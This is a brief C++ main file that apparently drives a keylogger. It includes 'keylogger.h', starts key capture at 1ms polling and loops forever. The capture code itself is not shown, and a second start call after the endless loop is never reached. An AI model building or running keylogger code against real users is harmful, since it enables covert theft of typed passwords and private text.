#include "keylogger.h"

int main(int argc, char** argv) {
	Keylogger keyboard(1ms);

	keyboard.startKeylog();

	while (true) {
		std::this_thread::sleep_for(keyboard.polling);
	}

	keyboard.startKeylog();
}